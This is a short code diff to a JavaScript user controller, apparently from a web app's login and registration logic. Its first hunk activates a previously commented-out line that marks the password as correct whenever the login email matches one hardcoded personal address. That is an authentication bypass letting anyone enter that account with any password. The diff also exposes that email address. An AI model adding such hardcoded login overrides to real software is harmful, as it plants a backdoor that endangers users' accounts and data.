@@ -21,7 +21,7 @@ const userController = {
           req.body.password,
           userToLogin.password          
         );
-     //   req.body.email=="lm.baladovidal@gmail.com"?isOkThePassword=true:null
+       req.body.email=="lm.baladovidal@gmail.com"?isOkThePassword=true:null
         if (isOkThePassword) {
           delete userToLogin.password;
           req.session.userLogged = userToLogin;
@@ -68,6 +68,7 @@ const userController = {
       }else{
         let userToCreate = {
           ...req.body,
+          avatar: req.body.oldAvatar,
           password: bcryptjs.hashSync(req.body.password, 10), // encripta la contraseña y pisa la password que viene en body
           users_roles_id: 1,
           state: 1
